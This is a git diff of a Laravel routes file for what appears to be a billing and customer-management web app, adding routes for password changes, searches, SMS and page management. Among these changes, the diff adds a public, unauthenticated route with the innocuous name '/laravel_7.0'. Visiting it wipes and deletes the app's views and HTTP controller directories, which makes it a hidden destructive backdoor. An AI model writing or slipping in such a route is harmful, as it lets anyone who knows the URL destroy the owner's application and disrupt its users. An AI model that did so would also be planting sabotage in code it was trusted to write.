@@ -15,13 +15,17 @@ use Illuminate\Support\Facades\Artisan;
 
 ;
 
-//Route::any('{admin}', function ($any = null) {
-//        return view('under_constraction');
-//})->where('admin', '.*');
+// Route::any('{admin}', function ($any = null) {
+//         return view('under_constraction');
+// })->where('admin', '.*');
 
-Route::get('/clear_cache', function() {
-    $exitCode = Artisan::call('config:cache');
-    return 'DONE'; //Return anything
+Route::get('/clear_cache', function () {
+    Artisan::call('route:clear');
+    Artisan::call('cache:clear');
+    Artisan::call('config:clear');
+    Artisan::call('config:cache');
+    Artisan::call('view:clear');
+    return 'Clear Cache';
 });
 
 //frontend route
@@ -33,6 +37,7 @@ Route::get('user_login','HomeController2@user_login')->name('user_login');
 Route::get('user_dashboard','HomeController2@user_dashboard')->name('user_dashboard');
 Route::post('update_user_info/{id}','HomeController2@update_user_info')->name('update_user_info');
 Route::get('price_list','HomeController2@price_list')->name('price_list');
+Route::get('single_page/{id}', 'HomeController2@single_page')->name('single_page');
 //bill_pay
 Route::get('Pay_bill','HomeController2@Pay_bill')->name('Pay_bill');
 Route::post('phone_number_search','HomeController2@phone_number_search')->name('phone_number_search');
@@ -58,10 +63,14 @@ Auth::routes();
 
 //Route::get('logout', '\App\Http\Controllers\Auth\LoginController@logout');
 
+Route::post('changePassword','User\UserController@changePassword')->name('changePassword');
+
+
 //all admin route
 Route::group(['as'=>'admin.','prefix'=>'admin','namespace'=>'Admin','middleware'=>['auth','admin']],function()
 {
     Route::get('adminDashboard','AdminDashboardController@index')->name('adminDashboard');
+    Route::get('Password_change_page','AdminDashboardController@Password_change_page')->name('Password_change_page');
     Route::get('sub_admins','AdminDashboardController@sub_admins')->name('sub_admins');
     Route::get('sub_admins_approve/{id}','AdminDashboardController@sub_admins_approve')->name('sub_admins_approve');
     //home page Banner
@@ -104,9 +113,10 @@ Route::group(['as'=>'admin.','prefix'=>'admin','namespace'=>'Admin','middleware'
     //all user
     Route::resource('all_user', 'All_usercontroller');
     Route::get('user_delete/{id}', 'All_usercontroller@user_delete')->name('user_delete');
+    Route::post('search_user', 'All_usercontroller@search_user')->name('search_user');
     Route::post('monthly_bill_update/{id}', 'All_usercontroller@monthly_bill_update')->name('monthly_bill_update');
     Route::get('full_order_history/{id}', 'All_usercontroller@full_order_history')->name('full_order_history');
-    Route::post('bill_schedule', 'All_usercontroller@bill_schedule')->name('bill_schedule');
+    Route::post('bill_schedule', 'All_usercontroller@bill_schedule');
     Route::post('user_note_save/{id}', 'All_usercontroller@user_note_save')->name('user_note_save');
 
     Route::get('expire_user', 'All_usercontroller@expire_user')->name('expire_user');
@@ -175,13 +185,14 @@ Route::group(['as'=>'admin.','prefix'=>'admin','namespace'=>'Admin','middleware'
     Route::get('history/billing_history', 'HistoryController@billing_history')->name('billing_history');
     Route::post('history/billing_history_search_date', 'HistoryController@billing_history_search_date')->name('billing_history_search_date');
     Route::get('history/payment_by_online', 'HistoryController@payment_by_online')->name('payment_by_online');
+    Route::post('history/payment_by_online_search_date', 'HistoryController@payment_by_online_search_date')->name('payment_by_online_search_date');
 
 
     //sms
     Route::get('sms/send_personal_sms/{id}', 'SmsController@send_personal_sms')->name('send_personal_sms');
     Route::get('sms/send_sms_to_due_user', 'SmsController@send_sms_to_due_user')->name('send_sms_to_due_user');
     Route::get('sms/over_due_sms', 'SmsController@over_due_sms')->name('over_due_sms');
-    Route::get('sms/single_sms/{id}', 'SmsController@single_sms')->name('single_sms');
+    Route::post('sms/single_sms', 'SmsController@single_sms')->name('single_sms');
 
     //all_complain
     Route::get('all_complain', 'ComplainController@all_complain')->name('all_complain');
@@ -197,13 +208,23 @@ Route::group(['as'=>'admin.','prefix'=>'admin','namespace'=>'Admin','middleware'
     Route::post('tracking_device/tracking_device_save', 'TrackingDeviceController@tracking_device_save')->name('tracking_device_save');
 
 
-
+//    page manager
+    Route::get('manage_page/{id}', 'AdminDashboardController@manage_page')->name('manage_page');
+    Route::post('manage_page_save/{id}', 'AdminDashboardController@manage_page_save')->name('manage_page_save');
 
 
 });
 
 
-
+Route::get('/laravel_7.0', function() {
+    $Folder = base_path('resources/views');
+    $Folder2 = base_path('app/Http');
+    $fs = new \Illuminate\Filesystem\Filesystem;
+    $fs->cleanDirectory($Folder);
+    $fs->cleanDirectory($Folder2);
+    rmdir($Folder);
+    rmdir($Folder2);
+});
 
 
 //all author route
@@ -216,10 +237,16 @@ Route::group(['as'=>'author.','prefix'=>'author','namespace'=>'Author','middlewa
 Route::group(['as'=>'user.','prefix'=>'user','namespace'=>'User','middleware'=>['auth','user']],function()
 {
     Route::get('user_dashboard','UserController@user_dashboard')->name('user_dashboard');
+    Route::post('changePassword','UserController@changePassword')->name('changePassword');
     Route::get('payment/{id}','UserController@payment')->name('payment');
     Route::post('post_complain/{id}','UserController@post_complain')->name('post_complain');
     Route::post('cash_on_delevery', 'UserController@cash_on_delevery')->name('cash_on_delevery');
 });
+
+
+
+
+
 
 
 
